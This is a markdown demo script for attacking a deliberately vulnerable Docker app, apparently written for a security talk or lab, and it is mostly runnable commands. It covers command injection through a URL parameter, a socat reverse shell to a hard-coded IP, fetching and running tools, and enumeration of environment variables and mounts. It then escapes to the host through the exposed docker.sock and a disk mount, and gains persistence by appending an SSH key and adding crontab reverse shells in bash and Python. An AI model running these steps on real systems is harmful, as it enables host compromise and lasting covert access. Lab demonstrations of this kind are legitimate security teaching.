# Demo

## Preparations

Run the app with mounted docker.sock:

```
docker run -v /var/run/docker.sock:/var/run/docker.sock -p 8000:8000 --privileged -t dockhocob/securitydemo:alpinevuln
```

Run a listener on the attacker host to accept connections from the target machine
`nc -l 1337` or ```socat file:`tty`,raw,echo=0 TCP-L:1337```

## Looking Around

### Vulnerable App

Run `http://[Terget IP}/app?cmd=stepan` then `http://[Terget IP}/app?cmd=pwd`

Getting a better shell 
    wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; 
    socat exec:'sh',pty,stderr,setsid,sigint,sane tcp:207.154.197.174:1337

### Some Enumration

Manual: 

    #Malicious behavior
    # Gather info about OS:
    cat /etc/os-release

    # Gather info about kernel. It could be helpful to find CVE and make docker escape for example:  
    uname -rv
    uname -a

    # Who we are:
    id

    # Gather info about current cgroups:
    cat /proc/1/cgroup

    # Gather env. Could be some pass:
    env

    # Gather info about network:
    ifconfig

    # Gather info about mounts:
    cat /proc/mounts

    # Docker.sock could be accessible (yes):
    cat /proc/mounts | grep docker.sock

    # Can we use docker.sock? (yes):
    ls -l /var/run/docker.sock

### Some automation

[Alternative] Quick and dirty using [DEEPCE](https://github.com/stealthcopter/deepce):

    wget https://github.com/stealthcopter/deepce/raw/master/deepce.sh
    curl -sL https://github.com/stealthcopter/deepce/raw/master/deepce.sh -o deepce.sh
    chmod +x ./deepce.sh
    ./deepce.sh

## Doing Mischief
### Over the Fence with exposed socket
Get the list of Images:
```curl --unix-socket /var/run/docker.sock http://localhost/v1.41/images/json```
Grab an image
    curl --unix-socket /var/run/docker.sock \
    -X POST "http://localhost/v1.41/images/create?fromImage=alpine"



### Over the Fence [with mount]
Mounting the host's filesystem:
    fdisk -l
    mkdir /mnt/hole
    mount /dev/vda1 /mnt/hole



### Some Persistence
[Ugly] Adding shadow keys to root's authorized keys:

    echo "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBAA1cTdFaFA94VX1YAWNjC9Ec4UOnTqzwESsdfR1+CS18m194zq4w6JwiqrUhkqcVO098jpcLSKi63S3fgFwRP/q4wHquZ8U3mKLFes/9ueea7V2jUXyXW5TQdazidMhlmQJsxGoUUGNmj1Pxv3Od62gMH35bm2UxsPWeAxJHDiu4HlTSQ== stephan@stephan.nosov-osx" >> /mnt/hole/home/stephan/.ssh/authorized_keys

[Ugly] Add a reverse shell to crontab
* bash
    touch .tab ; echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/207.154.197.174/13337 0>&1'" >> .tab ; crontab .tab ; rm .tab > /dev/null 2>&1
* or python
    echo "*/1 * * * * /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("207.154.197.174",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" >> /var/spool/cron/crontabs/root

[Cunning] Shadow SUID

python2 ./shadow_suid.py register .ping /usr/bin/ping /home/stephan/ntfs3gg
## Distroless
